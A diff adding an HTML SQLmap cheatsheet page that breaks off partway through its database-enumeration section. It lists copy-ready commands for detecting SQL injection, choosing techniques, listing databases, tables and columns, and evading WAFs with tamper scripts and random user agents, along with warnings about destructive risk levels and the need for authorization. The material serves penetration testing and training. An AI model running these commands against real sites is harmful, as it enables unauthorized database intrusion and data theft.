@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SQLmap Cheatsheet — SQL Injection &amp; Database Exploitation | OPKIT</title>
+  <meta name="description" content="Complete SQLmap reference: detection techniques, risk controls, database enumeration, data dumping, OS shell prerequisites, tamper scripts, troubleshooting, and one-click copy commands.">
+    <link rel="icon" type="image/webp" href="../images/Logo.webp">
+  <link rel="apple-touch-icon" href="../images/Logo.webp">
+  <link rel="stylesheet" href="../assets/style.css">
+  <style>:root { --tool-color: #e85a4a; }</style>
+</head>
+<body>
+<nav class="nav" role="navigation" aria-label="Main navigation">
+  <div class="nav__inner">
+        <a href="../index.html" class="nav__logo" aria-label="OPKIT Home">
+      <span class="nav__logo-mark" aria-hidden="true"><img src="../images/Logo.webp" alt="OPKIT Logo" class="nav__logo-img"></span>
+      <span class="nav__logo-text">OPKIT</span>
+    </a>
+    <div class="nav__links"><a href="../index.html" class="nav__link">Tools</a></div>
+    <div class="nav__search"><div class="nav__search-wrap" style="position:relative"><svg class="nav__search-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg><input id="nav-search" class="nav__search-input" type="search" placeholder="Search commands…" autocomplete="off" spellcheck="false" aria-label="Search commands"><div id="nav-search-dropdown" class="search-dropdown" role="listbox"></div></div></div>
+    <button class="nav__theme-btn" onclick="toggleTheme()" aria-label="Toggle theme"><span data-theme-icon></span></button>
+    <button class="nav__hamburger" id="nav-hamburger" aria-label="Open sidebar" onclick="document.getElementById('tool-sidebar').classList.toggle('is-open');document.getElementById('sidebar-overlay').classList.toggle('is-active')"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button>
+  </div>
+</nav>
+
+<div class="tool-page">
+  <div class="sidebar-overlay" id="sidebar-overlay" onclick="this.classList.remove('is-active');document.getElementById('tool-sidebar').classList.remove('is-open')"></div>
+  <aside class="tool-sidebar" id="tool-sidebar" aria-label="SQLmap navigation">
+    <div class="tool-sidebar__head">
+      <a href="../index.html" class="tool-sidebar__back"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 5l-7 7 7 7"/></svg>All tools</a>
+      <div class="tool-sidebar__tool-id">
+        <div class="tool-sidebar__icon">
+          <img src="https://www.kali.org/tools/sqlmap/images/sqlmap-logo.svg" alt="SQLmap" onerror="this.onerror=null;this.src='../images/tools/sqlmap.svg';">
+        </div>
+        <div>
+          <div class="tool-sidebar__name">SQLmap</div>
+          <div class="tool-sidebar__version">v1.8 · SQLi tool</div>
+        </div>
+      </div>
+    </div>
+    <nav class="tool-sidebar__nav" aria-label="Page sections">
+      <div class="sidebar-group">
+        <div class="sidebar-group__label">Reference</div>
+        <div class="sidebar-nav-item is-active" data-section="overview">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 6h16M4 12h16M4 18h7"/></svg>
+          Overview
+        </div>
+        <div class="sidebar-nav-item" data-section="pitfalls">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+          Critical Pitfalls &amp; Risks
+        </div>
+        <div class="sidebar-nav-item" data-section="detection">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+          Detection &amp; Techniques
+        </div>
+        <div class="sidebar-nav-item" data-section="flags">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"/></svg>
+          Core Flags
+        </div>
+        <div class="sidebar-nav-item" data-section="enumeration">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9h18v10a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V9Z"/><path d="M3 9V7a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2v2"/></svg>
+          Database Enumeration
+        </div>
+        <div class="sidebar-nav-item" data-section="dump">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+          Data Dumping
+        </div>
+        <div class="sidebar-nav-item" data-section="shell">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
+          OS Shell &amp; File Access
+        </div>
+        <div class="sidebar-nav-item" data-section="tamper">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m16 6-4-4-4 4"/><path d="M12 2v10.3"/><path d="m8 18 4 4 4-4"/><path d="M12 22v-4.7"/></svg>
+          Tamper Scripts (WAF)
+        </div>
+        <div class="sidebar-nav-item" data-section="troubleshooting">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+          Troubleshooting
+        </div>
+        <div class="sidebar-nav-item" data-section="cheatsheet">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+          Cheatsheet
+        </div>
+      </div>
+    </nav>
+  </aside>
+
+  <main class="tool-content" id="main-content">
+    <!-- Hero -->
+    <div class="tool-hero" id="overview">
+      <div class="tool-hero__kicker"><svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="12" r="10"/></svg>SQL Injection · Python</div>
+      <h1 class="tool-hero__title">SQLmap</h1>
+      <p class="tool-hero__desc">An automated detection and exploitation tool for SQL injection flaws across 9+ database engines (MySQL, PostgreSQL, Oracle, Microsoft SQL Server, SQLite, and more). Covers fingerprinting, schema mapping, data extraction, out-of-band takeover, and WAF evasion.</p>
+      <div class="tool-hero__tags">
+        <span class="tool-hero__tag">MySQL</span>
+        <span class="tool-hero__tag">PostgreSQL</span>
+        <span class="tool-hero__tag">MSSQL</span>
+        <span class="tool-hero__tag">Oracle</span>
+        <span class="tool-hero__tag">--technique=BEU</span>
+        <span class="tool-hero__tag">OS Shell</span>
+        <span class="tool-hero__tag">Tamper Scripts</span>
+        <span class="tool-hero__tag">Burp Integration</span>
+      </div>
+    </div>
+
+    <!-- First 3 Commands (Quick Start) -->
+    <div class="cmd-block is-open" style="margin-bottom: var(--sp-6); border-color: rgba(232, 90, 74, 0.35); box-shadow: 0 4px 20px rgba(0,0,0,0.18);" role="region" aria-label="First 3 Commands quick start">
+      <div class="cmd-block__head" style="background: rgba(232, 90, 74, 0.08); border-bottom-color: rgba(232, 90, 74, 0.2);">
+        <div>
+          <div class="cmd-block__label" style="display:flex; align-items:center; gap:var(--sp-2); color: var(--c-text);">
+            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:var(--tool-color, var(--c-danger));" aria-hidden="true"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+            First 3 Commands — Quick Start
+          </div>
+          <div class="cmd-block__desc">Fast, calibrated commands covering 90% of automated SQL injection audits.</div>
+        </div>
+      </div>
+      <div class="cmd-block__body">
+        <div class="code-line">
+          <span class="code-line__prompt" aria-hidden="true">$</span>
+          <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-u</span> <span class="tok-arg">"https://target/page?id=1"</span> <span class="tok-flag">--batch</span> <span class="tok-flag">--dbs</span></code>
+          <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); white-space:nowrap; opacity:0.85;">Detect &amp; list databases</span>
+          <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+        </div>
+        <div class="code-line">
+          <span class="code-line__prompt" aria-hidden="true">$</span>
+          <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-r</span> <span class="tok-val">request.txt</span> <span class="tok-flag">-p</span> <span class="tok-val">id</span> <span class="tok-flag">--batch</span> <span class="tok-flag">--level=3</span> <span class="tok-flag">--risk=2</span></code>
+          <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); white-space:nowrap; opacity:0.85;">Test from Burp request file</span>
+          <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+        </div>
+        <div class="code-line">
+          <span class="code-line__prompt" aria-hidden="true">$</span>
+          <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-u</span> <span class="tok-arg">"https://target/page?id=1"</span> <span class="tok-flag">--technique=BEU</span> <span class="tok-flag">--batch</span></code>
+          <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); white-space:nowrap; opacity:0.85;">Fast &amp; safe technique selection</span>
+          <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Critical Pitfalls & Risks (Warning Section) -->
+    <section class="content-section" id="pitfalls" aria-labelledby="pitfalls-title">
+      <div class="callout callout--warn" role="alert" style="margin-bottom: var(--sp-4);">
+        <svg class="callout__icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+        <div class="callout__body">
+          <strong style="color:var(--c-warn); display:block; margin-bottom:var(--sp-2);">Why is SQLmap failing (or taking forever)? — The --risk and --level traps.</strong>
+          <ul style="margin:0; padding-left:1.25rem; line-height:1.6; font-size:var(--t-sm);">
+            <li><strong><code>--risk=3</code> is destructive:</strong> Level 1 (default) avoids data changes. Level 2 adds heavy time-based queries. Level 3 adds OR-based payloads that can alter or delete data in live tables (e.g. <code>UPDATE/DELETE ... WHERE OR 1=1</code>). Never use <code>--risk=3</code> on production without explicit written authorization.</li>
+            <li><strong><code>--level=5</code> is slow, not smarter:</strong> Higher levels test more injection locations (Level 2 adds HTTP Cookie, Level 3 adds User-Agent and Referer, Level 5 adds Host header) but do not increase payload sophistication. Start at level 1; only raise if you suspect a non-standard injection vector.</li>
+            <li><strong>Default blind injection is painfully slow:</strong> If the target only discloses data via time-based blind queries, SQLmap's default single-thread and 5-second sleep checks take hours or time out. Accelerate extraction with <code>--threads=10</code> and calibrate with <code>--time-sec=2</code> (lowering baseline sleep from 5s to 2s).</li>
+            <li><strong>WAFs cause silent false negatives:</strong> When a WAF drops or resets SQLmap's signature payloads, SQLmap will report "all tested parameters do not appear to be injectable" even when an injection flaw is present. Always test with <code>--random-agent</code> and targeted <code>--tamper</code> scripts before concluding a parameter is secure.</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="callout callout--info" role="note">
+        <svg class="callout__icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+        <div class="callout__body">
+          <strong style="display:block; margin-bottom:var(--sp-1); color:var(--c-text);">Manual validation first, automation second.</strong>
+          SQLmap is an automated extraction engine, not a substitute for manual testing. Its default traffic signature is aggressively fingerprinted by intrusion detection systems. Always manually prove parameter reflection (using a single quote <code>'</code>, arithmetic expressions <code>2-1</code>, or a boolean test <code>AND 1=1</code>) before launching automation. Point SQLmap directly at the verified parameter with <code>-p</code> to prevent unnecessary scan noise.
+        </div>
+      </div>
+    </section>
+
+    <!-- 1. Detection & Techniques -->
+    <section class="content-section" id="detection" aria-labelledby="detection-title">
+      <h2 class="content-section__title" id="detection-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+        Detection &amp; Techniques
+      </h2>
+      <div class="cmd-list" role="list">
+        <!-- Block 1: Standard GET/POST -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Standard GET and POST parameter detection</div>
+              <div class="cmd-block__desc">Probe query string parameters or form data bodies in batch mode without interactive prompts.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-u</span> <span class="tok-arg">"https://target/page?id=1"</span> <span class="tok-flag">--batch</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-u</span> <span class="tok-arg">"https://target/login"</span> <span class="tok-flag">--data</span> <span class="tok-val">"user=admin&amp;pass=test"</span> <span class="tok-flag">--batch</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 2: From Burp Request File -->
+        <div class="cmd-block" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Testing from a saved Burp Suite request file</div>
+              <div class="cmd-block__desc">Replay complex authenticated requests with session cookies, custom headers, and multi-part bodies.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-r</span> <span class="tok-val">request.txt</span> <span class="tok-flag">-p</span> <span class="tok-val">id</span> <span class="tok-flag">--batch</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div style="font-size: var(--t-xs); color: var(--c-muted); padding: var(--sp-2) var(--sp-4); border-top: 1px solid rgba(255, 255, 255, 0.06); background: rgba(0, 0, 0, 0.12);">
+              <span style="color: var(--c-accent); font-weight: 600;">Critical Rule:</span> Always specify <code>-p &lt;parameter&gt;</code>. Without <code>-p</code>, SQLmap tests every header and parameter in the request, drastically slowing down execution and triggering WAF rate limits.
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 3: Technique Selection -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Technique selection (--technique=BEUSTQ)</div>
+              <div class="cmd-block__desc">Restrict attack modes to prioritize speed, avoid timeouts, and prevent unintended data modification.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="flags-table-wrap">
+              <table class="flags-table" role="table">
+                <thead><tr><th scope="col">Letter</th><th scope="col">Technique</th><th scope="col">Operational Characteristics</th></tr></thead>
+                <tbody>
+                  <tr><td><code class="flag-code">B</code></td><td class="flag-desc">Boolean-based blind</td><td class="flag-default">Slow bit-by-bit extraction; safe on production</td></tr>
+                  <tr><td><code class="flag-code">E</code></td><td class="flag-desc">Error-based</td><td class="flag-default">Fast extraction using DB runtime error messages</td></tr>
+                  <tr><td><code class="flag-code">U</code></td><td class="flag-desc">UNION query-based</td><td class="flag-default">Fastest technique; reflects data directly in HTTP response</td></tr>
+                  <tr><td><code class="flag-code">S</code></td><td class="flag-desc">Stacked queries</td><td class="flag-default">Executes multiple queries (can modify data; use with caution)</td></tr>
+                  <tr><td><code class="flag-code">T</code></td><td class="flag-desc">Time-based blind</td><td class="flag-default">Extremely slow delay queries; fallback when all else fails</td></tr>
+                  <tr><td><code class="flag-code">Q</code></td><td class="flag-desc">Inline queries</td><td class="flag-default">Subqueries inside SQL statements (rare in modern apps)</td></tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="code-line" style="border-top:1px solid rgba(255,255,255,0.06)">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-u</span> <span class="tok-arg">"https://target/page?id=1"</span> <span class="tok-flag">--technique=BEU</span> <span class="tok-flag">--batch</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Fast &amp; safe (no time delays, no stacked queries)</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-u</span> <span class="tok-arg">"https://target/page?id=1"</span> <span class="tok-flag">--technique=U</span> <span class="tok-flag">--batch</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">UNION-only (instant speed on CTFs &amp; vulnerable endpoints)</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div style="font-size: var(--t-xs); color: var(--c-muted); padding: var(--sp-2) var(--sp-4); background: rgba(0, 0, 0, 0.12);">
+              <span style="color: var(--c-danger); font-weight: 600;">Warning:</span> Stacked queries (<code>S</code>) can execute <code>INSERT</code>, <code>UPDATE</code>, and <code>DELETE</code>. Never enable stacked queries on production targets without authorization.
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 2. Core Flags -->
+    <section class="content-section" id="flags" aria-labelledby="flags-title">
+      <h2 class="content-section__title" id="flags-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"/></svg>
+        Core Operational Flags
+      </h2>
+      <div class="flags-table-wrap">
+        <table class="flags-table" role="table">
+          <thead><tr><th scope="col">Flag</th><th scope="col">Description</th><th scope="col">Why It Matters</th></tr></thead>
+          <tbody>
+            <tr><td><code class="flag-code">--technique=BEUSTQ</code></td><td class="flag-desc">Injection techniques to test (B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline)</td><td class="flag-default">BEU is fast &amp; safe; T is slow; S can alter data</td></tr>
+            <tr><td><code class="flag-code">--batch</code></td><td class="flag-desc">Non-interactive mode; accepts default answers automatically</td><td class="flag-default">Required for scripting, automation, and CI pipelines</td></tr>
+            <tr><td><code class="flag-code">--random-agent</code></td><td class="flag-desc">Rotate HTTP User-Agent headers per request</td><td class="flag-default">Bypasses basic signature-based WAF blocks</td></tr>
+            <tr><td><code class="flag-code">--threads=N</code></td><td class="flag-desc">Maximum concurrent HTTP requests (default 1)</td><td class="flag-default">Speeds up blind extractions; keep &le; 10 on production</td></tr>
+            <tr><td><code class="flag-code">--time-sec=N</code></td><td class="flag-desc">Seconds to delay for time-based blind (default 5)</td><td class="flag-default">Lower to 2&ndash;3 if target responds quickly to speed up scans</td></tr>
+            <tr><td><code class="flag-code">--dbms=name</code></td><td class="flag-desc">Force backend DBMS type (e.g. mysql, postgresql, mssql)</td><td class="flag-default">Skips fingerprinting probes and launches targeted payloads</td></tr>
+            <tr><td><code class="flag-code">--os=name</code></td><td class="flag-desc">Force backend OS type (e.g. linux, windows)</td><td class="flag-default">Optimizes filesystem read/write and shell payloads</td></tr>
+            <tr><td><code class="flag-code">--tamper=script</code></td><td class="flag-desc">WAF evasion scripts (e.g. space2comment,randomcase)</td><td class="flag-default">Essential for targets behind Cloudflare, AWS WAF, or ModSecurity</td></tr>
+            <tr><td><code class="flag-code">--proxy=URL</code></td><td class="flag-desc">Route SQLmap traffic through proxy (e.g. http://127.0.0.1:8080)</td><td class="flag-default">Inspect SQLmap traffic inside Burp Suite and debug payloads</td></tr>
+            <tr><td><code class="flag-code">--flush-session</code></td><td class="flag-desc">Clear cached session data and past test results</td><td class="flag-default">Use when a previous run has cached a false negative</td></tr>
+            <tr><td><code class="flag-code">--parse-errors</code></td><td class="flag-desc">Parse and display DBMS error messages</td><td class="flag-default">Helps diagnose why detection or extraction is failing</td></tr>
+            <tr><td><code class="flag-code">--eta</code></td><td class="flag-desc">Show estimated time of arrival</td><td class="flag-default">Useful for planning long blind extractions</td></tr>
+            <tr><td><code class="flag-code">-p param</code></td><td class="flag-desc">Test specific parameter only (e.g. -p id)</td><td class="flag-default">Prevents wasting requests on non-vulnerable fields</td></tr>
+            <tr><td><code class="flag-code">--level=1-5</code></td><td class="flag-desc">Scope of tests (1=GET/POST, 2=Cookie, 3=User-Agent/Referer, 5=Host)</td><td class="flag-default">Controls parameter coverage; level 5 is slow</td></tr>
+            <tr><td><code class="flag-code">--risk=1-3</code></td><td class="flag-desc">Risk of tests (1=safe, 2=heavy time-based, 3=OR-based data altering)</td><td class="flag-default">Never use risk 3 without authorization</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- 3. Database Enumeration -->
+    <section class="content-section" id="enumeration" aria-labelledby="enumeration-title">
+      <h2 class="content-section__title" id="enumeration-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9h18v10a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V9Z"/><path d="M3 9V7a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2v2"/></svg>
+        Database Enumeration
+      </h2>
+      <div class="cmd-list" role="list">
+        <!-- Block 1: Progressive Discovery -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Enumerate databases &rarr; tables &rarr; columns</div>
+              <div class="cmd-block__desc">Progressive discovery of the target database architecture and schema hierarchy.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-u</span> <span class="tok-arg">"https://target/page?id=1"</span> <span class="tok-flag">--dbs</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">List all accessible database names</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-u</span> <span class="tok-arg">"https://target/page?id=1"</span> <span class="tok-flag">-D</span> <span class="tok-val">app_db</span> <span class="tok-flag">--tables</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">List tables inside database app_db</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-u</span> <span class="tok-arg">"https://target/page?id=1"</span> <span class="tok-flag">-D</span> <span class="tok-val">app_db</span> <span class="tok-flag">-T</span> <span class="tok-val">users</span> <span class="tok-flag">--columns</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">List column names and data types</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 2: Enumerate DBMS Info & DBA Rights -->
+        <div class="cmd-block" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Enumerate DBMS version, current user, and DBA privileges</div>
+              <div class="cmd-block__desc">Assess administrative rights to determine if file access or OS execution is viable.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-u</span> <span class="tok-arg">"https://target/page?id=1"</span> <span class="tok-flag">--banner</span></code>
